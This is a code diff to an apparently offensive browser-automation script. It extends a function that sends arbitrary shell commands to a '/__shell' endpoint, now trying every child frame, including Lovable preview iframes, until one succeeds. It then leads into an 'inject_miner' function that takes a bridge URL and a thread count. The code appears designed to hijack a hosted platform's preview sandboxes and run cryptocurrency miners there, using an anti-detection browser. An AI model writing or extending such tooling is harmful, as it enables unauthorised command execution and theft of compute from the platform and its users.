@@ -31,6 +31,9 @@ async def shell_exec(page, cmd: str, cwd: str = None) -> dict:
     Bypasses window.doc entirely — works even when Camoufox doesn't
     evaluate the Vite module scripts that define window.doc.
 
+    Tries the page main frame first, then every child frame (Lovable
+    preview is an OOPIF; top-level often lacks /__shell).
+
     Returns: {"stdout": str, "stderr": str, "code": int, "cwd": str}
     """
     payload = json.dumps({"cmd": cmd, "cwd": cwd})
@@ -43,9 +46,37 @@ async def shell_exec(page, cmd: str, cwd: str = None) -> dict:
             headers: {{'Content-Type': 'application/json'}},
             body: body
         }});
-        return await r.json();
+        const text = await r.text();
+        try {{ return JSON.parse(text); }}
+        catch (e) {{
+            return {{code: -1, stdout: '', stderr: 'non-json HTTP ' + r.status + ': ' + text.slice(0, 160), cwd: ''}};
+        }}
     }}"""
-    return await page.evaluate(js)
+    errors = []
+    targets = [page]
+    try:
+        targets.extend(list(page.frames))
+    except Exception:
+        pass
+    seen = set()
+    for i, target in enumerate(targets):
+        try:
+            # Dedupe: page is frames[0] in Playwright
+            tid = id(target)
+            if tid in seen:
+                continue
+            seen.add(tid)
+            r = await target.evaluate(js)
+            if isinstance(r, dict) and r.get("code") == 0:
+                return r
+            if isinstance(r, dict):
+                errors.append(str(r.get("stderr") or r)[:120])
+        except Exception as e:
+            errors.append(f"{type(e).__name__}:{e}"[:80])
+    if errors:
+        return {"code": -1, "stdout": "", "stderr": " | ".join(errors[:4]), "cwd": ""}
+    return {"code": -1, "stdout": "", "stderr": "shell failed on all frames", "cwd": ""}
+
 
 
 async def inject_miner(page, bridge_url: str = BRIDGE_URL, threads: int = 64) -> bool:
